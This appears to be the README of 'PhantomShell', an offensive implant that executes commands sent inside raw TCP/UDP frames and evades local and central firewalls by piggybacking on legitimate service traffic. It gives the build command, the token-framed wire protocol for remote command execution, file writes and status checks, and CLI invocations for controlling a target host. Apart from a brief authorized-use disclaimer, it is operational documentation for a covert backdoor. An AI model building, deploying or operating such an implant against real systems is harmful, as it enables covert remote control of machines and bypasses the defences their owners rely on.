<p align="center">
  <img src="assets/phantom.png" alt="Phantom" width="120" height="120" />
</p>

<p align="center">As if firewalls didn't exist.</p>


# PhantomShell

Executes commands via raw TCP/UDP ethernet frames, bypassing local firewalls like `iptables` and central firewalling by piggybacking on legitimate service traffic. Listens on every port, all in one C file.

## Build

```
gcc -O2 -s -o phantomshell phantomshell.c
```

## Usage

`./phantomshell` - Listens on all interfaces, all UDP+TCP ports. Only processes packets destined for its local IP.

All payloads are framed with an 8-character hex token so they can be embedded anywhere in protocol traffic (e.g. HTTP body, URL parameter, after SSH banner). The implant finds the last occurrence of the keyword in the packet, then uses `:<token>` to delimit the end.

Wire format (CLI constructs these automatically):
- `runcap:<token>:<cmd>:<token>` - capture stdout/stderr, send back in token-prefixed 1400-byte chunks, bare token marks end
- `run:<token>:<cmd>:<token>` - fire and forget, no output
- `write:<token>:<w|a>:<path>:<b64data>:<token>` - write or append file contents
- `status:<token>:<token>` - replies `<token>up`

## CLI

`phantomshell-cli.py` requires scapy and root. Root is needed for scapy's L2 sniff and to insert iptables INPUT DROP rules that prevent the kernel from sending RSTs to the implant's raw replies. Rules are cleaned up on exit.

TCP (connects to a real open port, sniffs the raw reply):
```
python3 phantomshell-cli.py -t <ip> --tcp -p 22 -c id
python3 phantomshell-cli.py -t <ip> --tcp -p 80 -c id
python3 phantomshell-cli.py -t <ip> --tcp -p 80 -i
```

UDP (default):
```
python3 phantomshell-cli.py -t <ip> -c <cmd>
python3 phantomshell-cli.py -t <ip> -c <cmd> --nocap
python3 phantomshell-cli.py -t <ip> -i
```

## Disclaimer

This tool is intended for authorized and educational purposes only. Do not use it against systems you do not have explicit permission to test. 